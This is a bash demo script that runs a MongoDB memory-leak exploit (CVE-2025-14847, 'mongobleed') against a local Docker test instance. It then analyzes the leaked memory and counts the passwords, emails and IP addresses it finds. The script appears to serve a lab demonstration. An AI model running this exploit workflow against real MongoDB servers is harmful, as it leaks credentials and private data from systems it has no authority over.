#!/bin/bash
# demo.sh - MongoDB Memory Leak Analysis Demo
# 演示完整的漏洞利用和分析流程

set -e

echo "=================================================="
echo "MongoDB Memory Leak (CVE-2025-14847) Demo"
echo "=================================================="
echo ""

# 检查Docker是否运行
if ! docker ps &> /dev/null; then
    echo "❌ Docker未运行，请先启动Docker"
    exit 1
fi

# 步骤1: 启动MongoDB
echo "步骤 1/4: 启动MongoDB测试环境..."
docker-compose up -d
echo "✅ MongoDB已启动"
echo ""

# 等待MongoDB就绪
echo "等待MongoDB启动..."
sleep 5

# 步骤2: 运行漏洞利用
echo "步骤 2/4: 运行mongobleed漏洞利用..."
python3 mongobleed.py --host localhost --port 27017 \
    --min-offset 20 \
    --max-offset 1000 \
    --output leaked.bin

echo ""
echo "✅ 内存泄露数据已保存到 leaked.bin"
echo ""

# 检查是否生成了leaked.bin
if [ ! -f "leaked.bin" ]; then
    echo "❌ 未能生成 leaked.bin 文件"
    exit 1
fi

FILE_SIZE=$(stat -f%z "leaked.bin" 2>/dev/null || stat -c%s "leaked.bin" 2>/dev/null || echo "0")
echo "📊 泄露数据大小: $FILE_SIZE 字节"
echo ""

# 步骤3: 分析泄露数据
echo "步骤 3/4: 分析泄露的内存数据..."
python3 analyzer.py leaked.bin \
    --output-txt analysis.txt \
    --output-html analysis.html \
    --format both

echo ""
echo "✅ 分析完成"
echo ""

# 步骤4: 显示结果摘要
echo "步骤 4/4: 结果摘要"
echo "=================================================="
echo ""

# 显示文本报告的前50行
echo "📄 文本报告预览 (analysis.txt):"
echo "---"
head -n 50 analysis.txt
echo ""
echo "... (查看完整报告: cat analysis.txt)"
echo ""

# 检查HTML报告
if [ -f "analysis.html" ]; then
    HTML_SIZE=$(stat -f%z "analysis.html" 2>/dev/null || stat -c%s "analysis.html" 2>/dev/null)
    echo "🌐 HTML报告已生成: analysis.html ($HTML_SIZE 字节)"
    echo ""
    echo "查看HTML报告："
    echo "  方式1: 在容器内打开浏览器"
    echo "    \$BROWSER analysis.html"
    echo ""
    echo "  方式2: 复制到本地查看"
    echo "    docker cp <container_id>:/workspaces/mongobleed/analysis.html ."
    echo ""
fi

# 统计发现的敏感信息
echo "🔍 敏感信息统计："
echo "---"

if [ -f "analysis.txt" ]; then
    PASSWORDS=$(grep -c "password" analysis.txt 2>/dev/null || echo "0")
    EMAILS=$(grep -c "@" analysis.txt 2>/dev/null || echo "0")
    IPS=$(grep -oE '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' analysis.txt 2>/dev/null | wc -l || echo "0")
    
    echo "  密码相关: $PASSWORDS 处"
    echo "  邮箱地址: $EMAILS 处"
    echo "  IP地址: $IPS 个"
fi

echo ""
echo "=================================================="
echo "✅ 演示完成！"
echo "=================================================="
echo ""
echo "生成的文件："
echo "  - leaked.bin       (原始内存泄露数据)"
echo "  - analysis.txt     (文本分析报告)"
echo "  - analysis.html    (可视化HTML报告)"
echo ""
echo "清理环境："
echo "  docker-compose down    (停止MongoDB)"
echo "  rm leaked.bin analysis.* (删除生成的文件)"
echo ""
